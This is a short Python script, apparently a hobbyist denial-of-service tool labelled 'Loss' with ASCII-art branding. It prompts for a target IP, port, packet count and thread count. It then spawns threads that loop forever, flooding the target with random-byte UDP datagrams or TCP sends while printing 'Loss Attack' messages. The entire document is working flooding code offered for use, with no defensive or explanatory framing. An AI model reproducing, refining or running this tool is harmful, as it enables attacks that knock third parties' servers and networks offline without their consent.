#!/usr/bin/env python3
import random
import socket
import threading
import os

os.system("clear")

print("""\033[32m\n
▄▄▌        .▄▄ · .▄▄ ·    
██•  ▪     ▐█ ▀. ▐█ ▀.    
██▪   ▄█▀▄ ▄▀▀▀█▄▄▀▀▀█▄   
▐█▌▐▌▐█▌.▐▌▐█▄▪▐█▐█▄▪▐█   
.▀▀▀  ▀█▄▀▪ ▀▀▀▀  ▀▀▀▀  ▀ 
\033[92m\n""")

ip = str(input("\033[33m>>> \033[31mIP TARGET : "))
port = int(input("\033[33m>>> \033[31mPORT TARGET : "))
choice = str(input("\033[33m>>> \033[31mREADY? (y/n) : "))
times = int(input("\033[33m>>> \033[31mPACKETS : "))
threads = int(input("\033[33m>>> \033[31mTHREADS : "))
def run():
	data = random._urandom(577)
	i = random.choice(("\033[91?m[@]","[$]","[!]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" \033[94mLoss Attack To Ip Port \033[93m{}:{} \033[91m!!!".format(ip,port))
		except:
			print("\033[91m[•] \033[94mLoss Attack To Ip Port \033[33m{}:{} \033[91m!!!".format(ip,port))

def run2():
	data = random._urandom(666)
	i = random.choice(("\033[91m[!]","[@]","[$]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" \033[94mLoss Attack To Ip Port \033[33m{}:{} \033[91m!!!".format(ip,port))
		except:
			s.close()
			print("\033[91m[•] \033[94mLoss Attack To Ip Port \033[33m{}:{} \033[91m!!!".format(ip,port))

for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start()